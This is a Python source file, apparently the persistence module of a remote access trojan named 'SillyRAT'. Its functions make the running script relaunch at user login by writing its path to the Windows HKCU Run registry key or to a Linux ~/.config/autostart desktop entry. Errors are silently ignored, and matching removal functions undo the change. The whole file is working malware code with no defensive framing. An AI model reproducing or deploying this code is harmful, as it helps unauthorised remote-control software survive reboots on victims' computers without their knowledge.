import os
import sys

class PERSISTENCE:

    def __init__(self):
        pass
        
    def add_persistence(self, name="SillyRAT"):
        
        if sys.platform.startswith("win"):
            self._add_windows_persistence(name)
        elif sys.platform.startswith("linux"):
            self._add_linux_persistence(name)
        else:
            pass
    
    def _add_windows_persistence(self, name):
        try:
            import winreg as reg
            file_path = sys.argv[0]
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            except FileNotFoundError:
                reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, key)
            reg.SetValueEx(reg_key, name, 0, reg.REG_SZ, file_path)
            reg.CloseKey(reg_key)
        except Exception as e:
            pass  
    
    def _add_linux_persistence(self, name):
 
        try:
            file_path = sys.argv[0]
            autostart_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            
            desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {file_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name={name}
"""
            desktop_file = os.path.join(autostart_dir, f"{name.lower()}.desktop")
            with open(desktop_file, "w") as f:
                f.write(desktop_entry)
      
            os.chmod(desktop_file, 0o755)
        except Exception as e:
            pass 
    
    def remove_persistence(self, name="SillyRAT"):
       
        if sys.platform.startswith("win"):
            self._remove_windows_persistence(name)
        elif sys.platform.startswith("linux"):
            self._remove_linux_persistence(name)
    
    def _remove_windows_persistence(self, name):
       
        try:
            import winreg as reg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                reg.DeleteValue(reg_key, name)
                reg.CloseKey(reg_key)
            except FileNotFoundError:
                pass
        except Exception as e:
            pass
    
    def _remove_linux_persistence(self, name):
        
        try:
            autostart_dir = os.path.expanduser("~/.config/autostart")
            desktop_file = os.path.join(autostart_dir, f"{name.lower()}.desktop")
            if os.path.exists(desktop_file):
                os.remove(desktop_file)
        except Exception as e:
            pass
        
